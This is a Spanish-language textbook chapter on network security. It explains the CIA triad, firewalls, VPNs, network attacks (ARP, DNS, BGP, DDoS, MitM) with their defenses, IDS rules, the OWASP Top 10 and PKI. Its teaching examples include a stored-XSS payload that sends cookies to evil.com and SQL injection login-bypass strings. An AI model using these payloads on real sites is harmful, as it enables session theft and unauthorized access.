\chapter{\eh{locked} Seguridad en Redes}

\begin{concepto}
Todos los protocolos de este libro tienen vectores de ataque. Este capítulo
consolida los conceptos de seguridad: qué garantías busca la seguridad,
cómo se rompen, y cómo se defienden. La seguridad no es un feature que
se agrega al final --- es un diseño desde cero.
\end{concepto}

\section{\eh{triangular-ruler} Tríada CIA --- Los Tres Pilares}

\begin{concepto}
Toda la seguridad informática se reduce a tres objetivos. Memorizarlos:
\textbf{CIA} (Confidentiality, Integrity, Availability).

\emoji{light-bulb} \textbf{Analogía:} una caja fuerte en un banco.
\textbf{Confidencialidad} = solo el dueño puede abrir la caja.
\textbf{Integridad} = el contenido no fue alterado.
\textbf{Disponibilidad} = cuando el dueño llega, la caja está accesible.
\end{concepto}

\begin{table}[h!]
\centering
\renewcommand{\arraystretch}{1.5}
\begin{tabular}{llll}
\toprule
\textbf{Pilar} & \textbf{Pregunta} & \textbf{Amenaza} & \textbf{Mecanismo} \\
\midrule
\textbf{Confidentiality} & Solo el destinatario lee? & Intercepción, sniffing & Cifrado (TLS, WireGuard) \\
\textbf{Integrity} & Los datos llegaron íntegros? & Tampering, modificación & HMAC, firmas digitales \\
\textbf{Availability} & El servicio está disponible? & DDoS, ransomware & Redundancia, rate limiting \\
\bottomrule
\end{tabular}
\caption{Tríada CIA}
\end{table}

\begin{ejemplo}
Un atacante que hace \textbf{ARP Spoofing} rompe \textbf{Confidencialidad}
(ve tu tráfico) e \textbf{Integridad} (puede modificarlo).
Un \textbf{DDoS} rompe \textbf{Availability}.
Un \textbf{ransomware} rompe \textbf{Integrity} y \textbf{Availability}.
\end{ejemplo}

\section{\eh{fire} Firewalls}

\begin{concepto}
Un \textbf{firewall} filtra tráfico según reglas. Es la primera línea
de defensa entre redes de diferente nivel de confianza (Internet vs LAN).

\emoji{light-bulb} \textbf{Analogía:} el guardia de seguridad de un edificio.
Revisa quién entra y sale según una lista de reglas.
\end{concepto}

\begin{table}[h!]
\centering
\renewcommand{\arraystretch}{1.4}
\begin{tabular}{lll}
\toprule
\textbf{Tipo} & \textbf{Opera en} & \textbf{Características} \\
\midrule
Packet filter (L3/L4) & IP, TCP/UDP, puertos & Rápido, sin estado, fácil de evadir \\
Stateful (L4)         & Tracks conexiones TCP & Ve si paquete pertenece a flujo legítimo \\
Application (L7)      & Contenido de la app   & Deep Packet Inspection, más lento \\
NGFW (Next-Gen)       & L3-L7 + IDS/IPS       & Identidad de usuario, SSL inspection \\
WAF                   & HTTP/HTTPS            & Protege apps web (SQLi, XSS, OWASP) \\
\bottomrule
\end{tabular}
\caption{Tipos de firewall}
\end{table}

\subsection{Reglas de firewall --- Lógica básica}

\begin{lstlisting}
  Regla (stateless packet filter):
  ┌────────┬──────────┬──────────┬──────────┬──────────┬────────┐
  │ Source │ Src Port │   Dest   │ Dst Port │ Protocol │ Action │
  ├────────┼──────────┼──────────┼──────────┼──────────┼────────┤
  │  any   │   any    │ 10.0.0.5 │   443    │   TCP    │ ALLOW  │
  │  any   │   any    │ 10.0.0.5 │    80    │   TCP    │ ALLOW  │
  │  any   │   any    │   any    │   any    │   any    │  DENY  │ ← default deny
  └────────┴──────────┴──────────┴──────────┴──────────┴────────┘

  Principio: todo lo que no esté explícitamente permitido, está DENEGADO.
\end{lstlisting}

\begin{cuidado}
\textbf{SSL Inspection en NGFWs:} un NGFW puede descifrar TLS para inspeccionarlo
(MITM corporativo). El firewall presenta su propio certificado al cliente. Esto
rompe End-to-End Encryption a nivel corporativo. Es legal (en entornos corporativos,
la empresa es dueña de los dispositivos), pero debes saber que tu tráfico HTTPS
podría ser inspeccionado en redes corporativas.
\end{cuidado}

\section{\eh{locked-with-key} VPN --- Virtual Private Network}

\begin{concepto}
Una \textbf{VPN} crea un túnel cifrado sobre una red no confiable (Internet).
Todo el tráfico viaja por ese túnel, protegido de observadores externos.
\end{concepto}

\begin{table}[h!]
\centering
\renewcommand{\arraystretch}{1.3}
\begin{tabular}{lllll}
\toprule
\textbf{Protocolo} & \textbf{Puerto} & \textbf{Crypto} & \textbf{Velocidad} & \textbf{Uso típico} \\
\midrule
PPTP       & 1723/TCP & RC4 (roto) & Rápido & \emoji{skull} Evitar \\
L2TP/IPsec & 1701/UDP + 4500 & AES & Mediano & Empresas legacy \\
OpenVPN    & 1194/UDP o 443 & TLS & Mediano & Uso general \\
IKEv2/IPsec & 500+4500/UDP & AES-GCM & Rápido & Móviles \\
WireGuard  & 51820/UDP & ChaCha20 & \textbf{Muy rápido} & Moderno, recomendado \\
\bottomrule
\end{tabular}
\caption{Protocolos VPN comparados}
\end{table}

\subsection{mTLS --- Mutual TLS}

\begin{concepto}
TLS normal: el cliente verifica la identidad del servidor (certificado).
\textbf{mTLS} (Mutual TLS): \textit{ambos} se verifican mutuamente.
El servidor también exige un certificado válido del cliente.
\end{concepto}

\begin{lstlisting}
  TLS normal:
    Cliente ──── verifica certificado ────► Servidor
    Cliente ◄──────────────────────────── Servidor (confiado)

  mTLS:
    Cliente ──── verifica certificado ────► Servidor
    Cliente ◄──── verifica certificado ─── Servidor
    (AMBOS presentan certificados X.509)

  Uso: microservicios, APIs inter-servicio, Zero Trust.
  El servicio A no habla con el servicio B a menos que tenga
  el certificado correcto --- elimina acceso no autorizado incluso
  dentro de la red interna.
\end{lstlisting}

\section{\eh{detective} Ataques de Red --- Catálogo}

\subsection{ARP Spoofing / ARP Poisoning}

\begin{cuidado}
\textbf{ARP Spoofing:}

\begin{enumerate}
    \item ARP no tiene autenticación: cualquiera puede mandar un ARP Reply.
    \item El atacante envía ARP Replies falsos: ``La IP 192.168.1.1 tiene
          MAC aa:bb:cc:dd:ee:ff'' (la MAC del atacante).
    \item Las víctimas actualizan su ARP cache.
    \item Todo el tráfico destinado al gateway pasa por el atacante:
          \textbf{Man-in-the-Middle (MitM)}.
\end{enumerate}

\begin{lstlisting}
  Normal:    Víctima ──────────────────► Gateway ──► Internet
  Atacado:   Víctima ──► Atacante MitM ──► Gateway ──► Internet
                         (ve y modifica todo)
\end{lstlisting}

\textbf{Defensa:}
\begin{itemize}
    \item \textbf{Dynamic ARP Inspection (DAI):} el switch valida ARP contra
          la tabla DHCP Snooping. Si la MAC no coincide, descarta el paquete.
    \item \textbf{Static ARP entries:} configurar entradas ARP estáticas para
          el gateway (impracticable en redes grandes).
    \item \textbf{Cifrado end-to-end:} aunque el atacante intercepte el tráfico,
          no puede leerlo ni modificarlo (TLS, mTLS).
\end{itemize}
\end{cuidado}

\subsection{DNS Spoofing / Cache Poisoning}

\begin{cuidado}
\textbf{DNS Cache Poisoning:}

DNS usa UDP sin autenticación. El atacante puede enviar respuestas DNS
falsas antes de que llegue la legítima.

\begin{enumerate}
    \item Cliente hace query: ``¿IP de banco.com?''
    \item Atacante envía respuesta falsa más rápido que el servidor real:
          ``banco.com = 192.168.1.99'' (servidor del atacante)
    \item El resolver guarda la respuesta falsa en caché
    \item Todos los clientes que pregunten por banco.com van al servidor del atacante
\end{enumerate}

\textbf{Defensa:}
\begin{itemize}
    \item \textbf{DNSSEC:} firma criptográfica de los registros DNS. El resolver
          verifica la firma antes de aceptar la respuesta.
    \item \textbf{DoH/DoT:} cifra el canal DNS, evita inyección en tránsito.
    \item \textbf{Randomización de puerto origen y Query ID:} hace más difícil
          adivinar los parámetros de la query para enviar una respuesta falsa.
\end{itemize}
\end{cuidado}

\subsection{BGP Hijacking}

\begin{cuidado}
\textbf{BGP Hijacking:} BGP no tiene autenticación. Un ASN malicioso puede
anunciar prefijos IP que no le pertenecen --- y el tráfico de esos IPs
se redirige a través del atacante.

Ejemplo real: \textbf{Pakistan Telecom (2008)} anunció el prefijo de YouTube
(208.65.153.0/24) a level3, y durante 2 horas el tráfico de YouTube
de todo el mundo fue al nulo de Pakistan Telecom.

\textbf{Defensa:}
\begin{itemize}
    \item \textbf{RPKI (Resource Public Key Infrastructure):} firma criptográfica
          que une un prefijo IP a un ASN específico. Los routers descartan
          anuncios BGP sin firma válida.
    \item \textbf{Route filtering:} cada ISP solo acepta anuncios de prefijos
          que el peer tiene autorización de anunciar.
    \item \textbf{BGPsec:} extiende BGP con firmas por hop. Más seguro que RPKI
          solo, pero adopción lenta.
\end{itemize}
\end{cuidado}

\subsection{DDoS --- Distributed Denial of Service}

\begin{cuidado}
\textbf{DDoS:} agotar recursos de un servidor (CPU, RAM, ancho de banda)
con tráfico desde miles de fuentes simultáneas (botnet).

Tipos de DDoS:

\begin{center}
\renewcommand{\arraystretch}{1.3}
\begin{tabular}{lll}
\toprule
\textbf{Tipo} & \textbf{Mecanismo} & \textbf{Amplificación} \\
\midrule
Volumétrico & Inundar de datos (Gbps) & DNS Amplification (x70), NTP (x556) \\
Protocol    & Agotar tabla de estados & SYN Flood, Smurf \\
Application & Agotar recursos de app  & HTTP Flood, Slowloris \\
\bottomrule
\end{tabular}
\end{center}

\textbf{Amplificación DNS:} el atacante envía query DNS con IP de origen
\textit{suplantada} (IP de la víctima). El servidor DNS responde a la víctima
con un paquete $\sim$70x más grande. Con 1 Mbps de tráfico de ataque,
la víctima recibe 70 Mbps.

\textbf{Defensas:}
\begin{itemize}
    \item \textbf{Rate limiting:} limitar requests por IP en tiempo real
    \item \textbf{Anycast:} distribuir el tráfico entre múltiples datacenters globales
          (Cloudflare absorbe DDoS distribuyendo el tráfico a sus 200+ PoPs)
    \item \textbf{BCP38 (Ingress Filtering):} ISPs descartan paquetes con IP origen
          suplantada --- elimina amplificación en origen
    \item \textbf{SYN Cookies:} el servidor no guarda estado hasta recibir el ACK
\end{itemize}
\end{cuidado}

\subsection{Man-in-the-Middle (MitM)}

\begin{cuidado}
\textbf{MitM:} el atacante se interpone entre dos partes que creen comunicarse
directamente. Puede leer y modificar el tráfico.

Vectores comunes:
\begin{itemize}
    \item \textbf{Rogue Wi-Fi AP:} el atacante crea un hotspot ``Starbucks Free WiFi''
          y todo el tráfico pasa por su máquina.
    \item \textbf{ARP Spoofing:} como vimos en la sección anterior.
    \item \textbf{SSL Stripping:} el atacante intercepta la redirección HTTP→HTTPS
          y presenta HTTP al cliente mientras habla HTTPS con el servidor.
\end{itemize}

\textbf{Defensa universal:} \textbf{HSTS} (HTTP Strict Transport Security) ---
el servidor indica al browser que \textit{siempre} use HTTPS, nunca HTTP.
El browser rechaza versiones HTTP incluso si el atacante intenta forzarlas.
Con HSTS Preloading, el browser viene con la lista hardcoded antes de la primera
conexión.
\end{cuidado}

\section{\eh{bar-chart} IDS e IPS --- Detección y Prevención de Intrusiones}

\begin{table}[h!]
\centering
\renewcommand{\arraystretch}{1.4}
\begin{tabular}{llll}
\toprule
\textbf{Sistema} & \textbf{Nombre} & \textbf{Acción} & \textbf{Posición} \\
\midrule
IDS & Intrusion Detection System  & Detecta y alerta (pasivo)  & Fuera del flujo \\
IPS & Intrusion Prevention System & Detecta y bloquea (activo) & En el flujo \\
\bottomrule
\end{tabular}
\caption{IDS vs IPS}
\end{table}

Un IDS/IPS analiza el tráfico buscando \textbf{firmas} (patrones conocidos de
ataques) o \textbf{anomalías} (desviaciones del comportamiento normal).

\begin{ejemplo}
\textbf{Snort} (open source, Cisco) y \textbf{Suricata} son los IDS/IPS más
usados. Una regla Snort que detecta SYN Flood:

\begin{lstlisting}
alert tcp any any -> $HOME_NET any \
  (flags:S; \
   detection_filter:track by_dst, count 1000, seconds 1; \
   msg:"Posible SYN Flood detectado"; \
   sid:1000001;)
\end{lstlisting}

Esto alerta si un destino recibe más de 1000 SYNs por segundo.
\end{ejemplo}

\section{\eh{memo} OWASP Top 10 --- Los ataques más comunes a aplicaciones web}

\begin{concepto}
\textbf{OWASP} (Open Web Application Security Project) publica anualmente
el Top 10 de vulnerabilidades más críticas. Todo desarrollador debería
conocerlos.
\end{concepto}

\begin{table}[h!]
\centering
\renewcommand{\arraystretch}{1.3}
\begin{tabular}{lll}
\toprule
\textbf{\#} & \textbf{Vulnerabilidad} & \textbf{Ejemplo} \\
\midrule
1 & Broken Access Control       & Ver datos de otro usuario cambiando el ID en la URL \\
2 & Cryptographic Failures      & Contraseñas en MD5, HTTP sin TLS \\
3 & Injection (SQLi, XSS)       & \texttt{' OR 1=1;--} en un campo de login \\
4 & Insecure Design             & Flujos de negocio sin controles de seguridad \\
5 & Security Misconfiguration   & Servicios de debug activos en producción \\
6 & Vulnerable Components       & Usar log4j 2.14.0 (Log4Shell) \\
7 & Auth Failures               & Contraseñas débiles, sin MFA, tokens largos \\
8 & Software Integrity Failures & Dependencias sin verificar, CI/CD sin protección \\
9 & Logging \& Monitoring Failures & Sin logs de auth, sin alertas de anomalías \\
10 & SSRF                       & Servidor hace requests a su propia infraestructura \\
\bottomrule
\end{tabular}
\caption{OWASP Top 10 (2021)}
\end{table}

\subsection{SQL Injection}

\begin{cuidado}
\textbf{SQLi:} el atacante inyecta SQL en un campo de entrada.

\begin{lstlisting}[language=SQL]
-- Consulta original (vulnerable):
SELECT * FROM usuarios WHERE user='INPUT' AND pass='INPUT2';

-- El atacante escribe en el campo usuario:
-- admin'--
-- La consulta queda:
SELECT * FROM usuarios WHERE user='admin'--' AND pass='INPUT2';
-- El -- comenta el resto → login sin contraseña

-- O peor, escribe: ' OR 1=1;--
SELECT * FROM usuarios WHERE user='' OR 1=1;--' AND pass='';
-- Devuelve TODOS los usuarios
\end{lstlisting}

\textbf{Defensa:} \textbf{Prepared Statements / Parameterized Queries}.
El input nunca se interpreta como SQL.

\begin{lstlisting}
# Python con parameterized query (seguro):
cursor.execute("SELECT * FROM usuarios WHERE user=? AND pass=?",
               (usuario, password))
\end{lstlisting}
\end{cuidado}

\subsection{XSS --- Cross-Site Scripting}

\begin{cuidado}
\textbf{XSS:} el atacante inyecta JavaScript en una página web que otros
usuarios cargarán. El script se ejecuta en el browser de la víctima con
sus cookies y sesión.

\begin{lstlisting}
  Stored XSS:
  1. Atacante publica comentario:
     <script>fetch('http://evil.com/?c='+document.cookie)</script>
  2. Otro usuario carga la página con ese comentario
  3. El script roba la cookie de sesión del usuario → account takeover
\end{lstlisting}

\textbf{Defensa:}
\begin{itemize}
    \item \textbf{Output encoding:} convertir \texttt{<} → \texttt{\&lt;} antes de
          renderizar en HTML.
    \item \textbf{Content Security Policy (CSP):} header HTTP que indica al browser
          de qué fuentes puede cargar scripts. Bloquea scripts inline.
    \item \textbf{HttpOnly cookies:} cookies que JavaScript no puede leer,
          aunque inyecte código.
\end{itemize}
\end{cuidado}

\section{\eh{locked-with-key} PKI y Certificados --- Revisión de Confianza}

\begin{concepto}
La seguridad de HTTPS descansa en un ecosistema de \textbf{Autoridades
Certificadoras (CAs)} en las que los browsers confían implícitamente.
Los browsers/OS vienen con $\sim$100--200 CAs raíz preinstaladas.
\end{concepto}

\begin{lstlisting}
  Tipos de certificados:

  DV (Domain Validation):
   └── Solo verifica que el solicitante controla el dominio
       (Let's Encrypt lo hace automáticamente en minutos)

  OV (Organization Validation):
   └── Verifica que la organización existe legalmente
       (manual, tarda días)

  EV (Extended Validation):
   └── Verificación exhaustiva de la empresa
       (el nombre de la empresa aparecía en la barra verde - hoy browsers
        eliminaron la barra verde porque los usuarios no la entendían)
\end{lstlisting}

\begin{cuidado}
\textbf{Certificate Transparency (CT):} desde 2018, Chrome requiere que
todos los certificados sean registrados públicamente en logs CT (append-only,
auditables). Si una CA emite un certificado fraudulento para ``google.com'',
aparece en los logs y puede ser revocado. Antes de CT, las CAs podían emitir
certificados silenciosamente.

\textbf{Certificate Pinning:} apps móviles pueden hardcodear el hash del
certificado esperado. Si el certificado cambia (ataque MitM con cert falso),
la app rechaza la conexión. Riesgo: si la empresa cambia su certificado
legítimamente, la app rompe.
\end{cuidado}

\section{\eh{broom} RPKI --- Asegurando el Routing de Internet}

\begin{concepto}
\textbf{RPKI} (Resource Public Key Infrastructure) es la solución al BGP
Hijacking. Crea un sistema de firma criptográfica que prueba qué ASN tiene
autorización de anunciar qué prefijos IP.
\end{concepto}

\begin{lstlisting}
  Sin RPKI:
  AS64500 anuncia 8.8.8.0/24 (de Google)
  → Routers del mundo creen el anuncio
  → Tráfico a Google va a AS64500

  Con RPKI:
  AS64500 anuncia 8.8.8.0/24
  → Router verifica: ¿existe ROA (Route Origin Authorization)
    que diga que AS15169 (Google) puede anunciar 8.8.8.0/24?
  → La respuesta es SÍ → el anuncio de AS64500 es INVÁLIDO
  → Router descarta el anuncio
\end{lstlisting}

\begin{moderno}
\textbf{\emoji{rocket} Adopción de RPKI (2024):} Cloudflare, AT\&T, Telia, LACNIC
y muchos otros ya filtran anuncios RPKI-inválidos. Aproximadamente \textbf{40\%}
del espacio de direcciones IP global tiene ROAs publicadas. El progreso es lento:
requiere que cada ISP actualice su política de routing.

En México, LACNIC es el RIR que gestiona el registro de ROAs para LATAM.
\end{moderno}

\section{\eh{bar-chart} Herramientas de Diagnóstico y Seguridad}

\begin{table}[h!]
\centering
\renewcommand{\arraystretch}{1.3}
\begin{tabular}{lll}
\toprule
\textbf{Herramienta} & \textbf{Uso} & \textbf{Notas} \\
\midrule
\texttt{nmap}      & Escaneo de puertos y OS fingerprinting & Herramienta de pentesting estándar \\
\texttt{Wireshark} & Captura y análisis de paquetes (GUI) & Análisis de protocolos \\
\texttt{tcpdump}   & Captura de paquetes (CLI) & Para servidores sin GUI \\
\texttt{netstat/ss}& Ver conexiones activas y puertos & Diagnóstico local \\
\texttt{arp -a}    & Ver tabla ARP & Detectar ARP spoofing \\
\texttt{traceroute}& Ver ruta de paquetes & Detectar desvíos BGP \\
\texttt{curl -v}   & HTTP/HTTPS detallado & Ver headers, certificados \\
\texttt{openssl}   & Verificar certificados TLS & \texttt{openssl s\_client -connect host:443} \\
\bottomrule
\end{tabular}
\caption{Herramientas de red y seguridad}
\end{table}

\begin{codigo}
\begin{lstlisting}
# Ver certificado TLS de un servidor:
openssl s_client -connect google.com:443 -servername google.com

# Escanear puertos abiertos (autorización requerida):
nmap -sV -O 192.168.1.0/24

# Capturar tráfico en interfaz eth0:
tcpdump -i eth0 -w captura.pcap

# Ver conexiones activas:
ss -tulpn

# Verificar si una respuesta DNS tiene RRSIG (DNSSEC):
dig +dnssec google.com A
\end{lstlisting}
\end{codigo}

\section{\eh{magnifying-glass-tilted-right} Resumen: Defensa en Profundidad}

\begin{concepto}
\textbf{Defense in Depth} (Defensa en Profundidad): no depender de una sola
capa de seguridad. Si un control falla, los otros detienen al atacante.

\emoji{light-bulb} \textbf{Analogía:} una cebolla. Pelar una capa no da
acceso al centro --- hay más capas por atravesar.
\end{concepto}

\begin{lstlisting}
  Capas de defensa en una organización típica:

  Internet
     │
     ▼
  [Firewall perimetral + DDoS mitigation (Cloudflare/Akamai)]
     │
     ▼
  [DMZ: Load balancers, WAF, reverse proxies]
     │
     ▼
  [Red interna segmentada con VLANs]
     │ (cada segmento tiene su propio firewall)
     ▼
  [Hosts con: cifrado en disco, antivirus, EDR]
     │
     ▼
  [Aplicaciones: autenticación fuerte (MFA), autorización (RBAC/ABAC)]
     │
     ▼
  [Datos: cifrado en reposo (AES-256), en tránsito (TLS 1.3)]
     │
     ▼
  [Logging y SIEM: todo se registra, correlaciona y alerta]
\end{lstlisting}

Principios clave:
\begin{itemize}
    \item \textbf{Least Privilege:} cada usuario/proceso tiene solo los permisos
          que necesita para su función.
    \item \textbf{Fail-Closed:} si el sistema de seguridad falla, deniega acceso
          (no permite por defecto).
    \item \textbf{Assume Breach:} asumir que el atacante ya está dentro y
          diseñar para limitar el daño (Zero Trust).
    \item \textbf{Patch Management:} las vulnerabilidades conocidas son las más
          explotadas. Actualizar sistemas es la defensa más efectiva.
\end{itemize}
